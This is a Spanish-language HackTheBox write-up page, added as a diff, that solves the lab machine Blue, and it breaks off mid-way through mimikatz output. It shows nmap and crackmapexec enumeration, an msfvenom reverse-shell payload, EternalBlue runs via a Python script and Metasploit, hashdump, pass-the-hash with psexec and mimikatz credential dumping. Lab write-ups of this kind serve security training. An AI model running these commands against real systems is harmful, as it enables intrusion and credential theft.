@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Blue</title>
+
+  <meta name="description" content="Resolución de la máquina Blue de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Blue">
+  <meta name="twitter:description" content="Resolución de la máquina Blue de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/blue.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Blue">
+  <meta property="og:description" content="Resolución de la máquina Blue de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/blue.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/blue.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Blue" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#python">EternalBlue - Python</a></li>
+        <li><a href="#metasploit">EternalBlue - Metasploit</a></li>
+        <li><a href="#extra">Extra - Password</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h2>
+    <picture><img src="/images/htb/blue.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Blue</h2><br>
+  </header>
+
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code>, aunque realmente no hay muchos puertos abiertos más que smb y rcp</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.40
+Nmap scan report for 10.10.10.40  
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con crackmapexec a nivel de smb podemos ver que nos detecta que esta corriendo un <code class="language-plaintext highlighter-rouge">Windows 7 Service Pack 1 X64</code> además que esta corriendo un <code class="language-plaintext highlighter-rouge">SMBv1</code> sin firmar<p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.40
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="az">[*] </span><span class="p">Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tenemos un Windows 7 con <code class="language-plaintext highlighter-rouge">SMBv1</code> y la máquina se llama <code class="language-plaintext highlighter-rouge">Blue</code>, podemos probar con un script de nmap si es vulnerable al <code class="language-plaintext highlighter-rouge">Eternal Blue</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap</span><span class="p"> -p 445 --script smb-vuln-ms17-010 10.10.10.40
+Nmap scan report for 10.10.10.40
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|     A critical remote code execution vulnerability exists in Microsoft SMBv1  
+|      servers (ms17-010).</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="python">
+<br><h3 class="post-title">EternalBlue - Python</h3><br>
+
+<p class="plain-text">Si quisieramos explotarlo sin usar metasploit apoyandonos de un script en python podemos usar el repo de <a href="https://github.com/helviojunior/MS17-010">github</a>, al usar el checker nos dice que no tiene acceso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">checker.py 10.10.10.40
+Trying to connect to 10.10.10.40:445
+Target OS: Windows 7 Professional 7601 Service Pack 1  
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: STATUS_ACCESS_DENIED
+samr: STATUS_ACCESS_DENIED
+netlogon: STATUS_ACCESS_DENIED
+lsarpc: STATUS_ACCESS_DENIED
+browser: STATUS_ACCESS_DENIED</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Por defecto el script no usa nada como usuario y contraseña, al listar los recursos smb con <code class="language-plaintext highlighter-rouge">crackmapexec</code> de esta forma nos devuelve <code class="language-plaintext highlighter-rouge">STATUS_ACCESS_DENIED</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.40 -u </span><span class="am">''</span><span class="p"> -p </span><span class="am">''</span><span class="p"> --shares
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="az">[*] </span><span class="p">Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="ve">[+] </span><span class="p">haris-PC\:
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="sa">[-] </span><span class="p">Error enumerating shares: STATUS_ACCESS_DENIED</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al usar como usuario <code class="language-plaintext highlighter-rouge">null</code> y no proporcionar contraseña no devuelve ningun error y nos muestra los recursos compartidos existentes en la maquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.40 -u null -p </span><span class="am">''</span><span class="p"> --shares
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="az">[*] </span><span class="p">Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="ve">[+] </span><span class="p">haris-PC\null:
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="am">IPC$                            Remote IPC
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="am">Share           READ
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="am">Users           READ</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Basta con modificar el script cambiando el <code class="language-plaintext highlighter-rouge">USERNAME</code> por null y correrlo de nuevo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">USERNAME </span><span class="o">= </span><span class="s">'null'</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al correrlo esta vez funciona y despues de probar con varios pipes este nos devuelve <code class="language-plaintext highlighter-rouge">OK (64 bit)</code> en 2 de ellos que son los que podemos usar samr y lsarpc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">checker.py 10.10.10.40
+Trying to connect to 10.10.10.40:445
+Target OS: Windows 7 Professional 7601 Service Pack 1
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: STATUS_OBJECT_NAME_NOT_FOUND
+browser: STATUS_OBJECT_NAME_NOT_FOUND
+netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))  
+samr: Ok (64 bit)
+lsarpc: Ok (64 bit)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Es vulnerable asi que para explotarlo iniciaremos creando un archivo <code class="language-plaintext highlighter-rouge">exe</code> malicioso con msfvenom el cual nos enviara una <code class="language-plaintext highlighter-rouge">powershell</code> cuando este se ejecute</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1877 bytes
+Final size of exe file: 8192 bytes
+Saved as: shell.exe</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Modificamos el script cambiando el usuario a <code class="language-plaintext highlighter-rouge">null</code> y lo ejecutamos pasandole lo siguiente como argumentos ip de la maquina, exe malicioso, puerto, pipe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">send_and_execute.py 10.10.10.40 shell.exe 445 samr  
+Trying to connect to 10.10.10.40:445
+Target OS: Windows 7 Professional 7601 Service Pack 1
+Target is 64 bit
+Got frag size: 0x10
+GROOM_POOL_SIZE: 0x5030
+BRIDE_TRANS_SIZE: 0xfa0
+CONNECTION: 0xfffffa8001ebfba0
+SESSION: 0xfffff8a001b2f6e0
+FLINK: 0xfffff8a0005b4088
+InParam: 0xfffff8a00053e15c
+MID: 0x4007
+unexpected alignment, diff: 0x75088
+leak failed... try again
+CONNECTION: 0xfffffa8001ebfba0
+SESSION: 0xfffff8a001b2f6e0
+FLINK: 0xfffff8a0005c0088
+InParam: 0xfffff8a0005ba15c
+MID: 0x4103
+success controlling groom transaction
+modify trans1 struct for arbitrary read/write
+make this SMB session to be SYSTEM
+overwriting session security context
+Sending file 14Z5CV.exe...
+Opening SVCManager on 10.10.10.40.....
+Creating service ljTi.....
+Starting service ljTi.....
+The NETBIOS connection with the remote host timed out.
+Removing service ljTi.....
+ServiceExec Error on: 10.10.10.40
+nca_s_proto_error
+Done</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de ejecutar el exploit el exe se ejecutara y nos enviara una powershell como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> con maximos privilegios en el equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.40
+Windows PowerShell running as user HARIS-PC$ on HARIS-PC
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="metasploit">
+<br><h3 class="post-title">EternalBlue - Metasploit</h3><br>
+
+<p class="plain-text">Es vulnerable, en este caso lo explotaremos con metasploit, ejecutamos <code class="language-plaintext highlighter-rouge">msfconsole</code> y definimos el exploit que queremos utilizar, en este caso el ms17-010 (EternalBlue)</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo msfconsole</span><span class="p"> -q
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) >> use exploit/windows/smb/ms17_010_eternalblue
+</span><span class="az">[*] </span><span class="p">No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp  
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">windows/smb/ms17_010_eternalblue</span><span class="p">) >></span> 
+</code></pre></div></div><br>
+
+<p class="plain-text">Seteamos en rhosts la dirección ip de la máquina victima y como lhost la interfaz tun0</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">windows/smb/ms17_010_eternalblue</span><span class="p">) >> set rhosts 10.10.10.40  
+rhosts => 10.10.10.40
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">windows/smb/ms17_010_eternalblue</span><span class="p">) >> set lhost tun0
+lhost => tun0
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">windows/smb/ms17_010_eternalblue</span><span class="p">) >></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al correrlo conseguimos una sesión de meterpreter <code class="language-plaintext highlighter-rouge">nt authority\system</code> directamente, que es el usuario con maximos privilegios en los equipos Windows</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">windows/smb/ms17_010_eternalblue</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.10.14.10:4444
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+</span><span class="ve">[+] </span><span class="p">10.10.10.40:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)  
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445    - Scanned 1 of 1 hosts (100% complete)
+</span><span class="ve">[+] </span><span class="p">10.10.10.40:445 - The target is vulnerable.
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - Connecting to target for exploitation.
+</span><span class="ve">[+] </span><span class="p">10.10.10.40:445 - Connection established for exploitation.
+</span><span class="ve">[+] </span><span class="p">10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
+</span><span class="ve">[+] </span><span class="p">10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - Sending all but last fragment of exploit packet
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - Starting non-paged pool grooming
+</span><span class="ve">[+] </span><span class="p">10.10.10.40:445 - Sending SMBv2 buffers
+</span><span class="ve">[+] </span><span class="p">10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - Sending final SMBv2 buffers.
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - Sending last fragment of exploit packet!
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - Receiving response from exploit packet
+</span><span class="ve">[+] </span><span class="p">10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - Sending egg to corrupted connection.
+</span><span class="az">[*] </span><span class="p">10.10.10.40:445 - Triggering free of corrupted buffer.
+</span><span class="az">[*] </span><span class="p">Sending stage (200774 bytes) to 10.10.10.40
+</span><span class="ve">[+] </span><span class="p">10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</span><span class="ve">[+] </span><span class="p">10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</span><span class="ve">[+] </span><span class="p">10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</span><span class="az">[*] </span><span class="p">Meterpreter session 1 opened (10.10.14.10:4444 -> 10.10.10.40:49158) at 2023-02-09 19:18:56 -0600
+
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) > getuid
+Server username: NT AUTHORITY\SYSTEM
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con el comando shell en meterpreter obtenemos una cmd, en C:\Users podemos ver solo 2 usuarios, en el Desktop estan ambas flags y tenemos privilegios para leerlas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) > shell
+Process 2852 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.  
+
+C:\Windows\system32></span><span class="am"> cd </span><span class="p">C:\Users
+
+C:\Users></span><span class="am"> dir</span><span class="p">
+
+ Volume in drive C has no label.
+ Volume Serial Number is BE92-053B
+
+ Directory of C:\Users
+
+21/07/2017  06:56    &ltDIR>          .
+21/07/2017  06:56    &ltDIR>          ..
+21/07/2017  06:56    &ltDIR>          Administrator
+14/07/2017  13:45    &ltDIR>          haris
+12/04/2011  07:51    &ltDIR>          Public
+
+               0 File(s)              0 bytes
+               5 Dir(s)   2,429,788,160 bytes free
+
+C:\Users></span><span class="am"> type </span><span class="p">C:\Users\haris\Desktop\user.txt
+059**************************681
+
+C:\Users></span><span class="am"> type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+399**************************deb
+
+C:\Users></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar la función de meterpreter para dumpear la <code class="language-plaintext highlighter-rouge">sam</code> y ver los hashes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::  
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos el hash NT de Administrator con crackmapexec y devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.40 -u Administrator -H cdf51b162460b7d5bc898f493751a0cc
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="az">[*] </span><span class="p">Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="ve">[+] </span><span class="p">haris-PC\Administrator:cdf51b162460b7d5bc898f493751a0cc </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">psexec</code> o wmiexec de impacket podemos conectarnos haciendo un passthehash y obtener una cmd como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-psexec </span><span class="p">WORKGROUP/Administrator@10.10.10.40 -hashes :cdf51b162460b7d5bc898f493751a0cc  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.10.10.40.....
+[*] Found writable share ADMIN$
+[*] Uploading file zqdeRFGe.exe
+[*] Opening SVCManager on 10.10.10.40.....
+[*] Creating service BawI on 10.10.10.40.....
+[*] Starting service BawI.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="extra">
+<br><h3 class="post-title">Extra - Password</h3><br>
+
+<p class="plain-text">Solo como complemento podemos subir el <code class="language-plaintext highlighter-rouge">mimikatz.exe</code> y dumpear las logon passwords esto nos permite ver la <code class="language-plaintext highlighter-rouge">contraseña</code> de Administrator en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) > upload mimikatz.exe  
+</span><span class="az">[*] </span><span class="p">Uploading  : /home/kali/mimikatz.exe -> mimikatz.exe
+</span><span class="az">[*] </span><span class="p">Completed  : /home/kali/mimikatz.exe -> mimikatz.exe
+</span><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) > shell
+Process 2916 created.
+Channel 5 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> </span><span class="am">.\mimikatz.exe </span><span class="az">"sekurlsa::logonPasswords" </span><span class="p">exit
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/  
+
+mimikatz(commandline) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 433695 (00000000:00069e1f)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : haris-PC
+Logon Server      : HARIS-PC
+Logon Time        : 28/05/2023 19:42:39
+SID               : S-1-5-21-319597671-3711062392-2889596693-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	 * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	 * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * Password : ejfnIWWDojfWEKM
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 242258 (00000000:0003b252)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : haris-PC
+Logon Server      : HARIS-PC
+Logon Time        : 28/05/2023 19:42:31
+SID               : S-1-5-21-319597671-3711062392-2889596693-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	 * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	 * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * Password : ejfnIWWDojfWEKM
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 28/05/2023 19:42:10
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : HARIS-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 28/05/2023 19:42:10
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : HARIS-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : haris-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 41719 (00000000:0000a2f7)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 28/05/2023 19:42:10
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : HARIS-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 28/05/2023 19:42:10
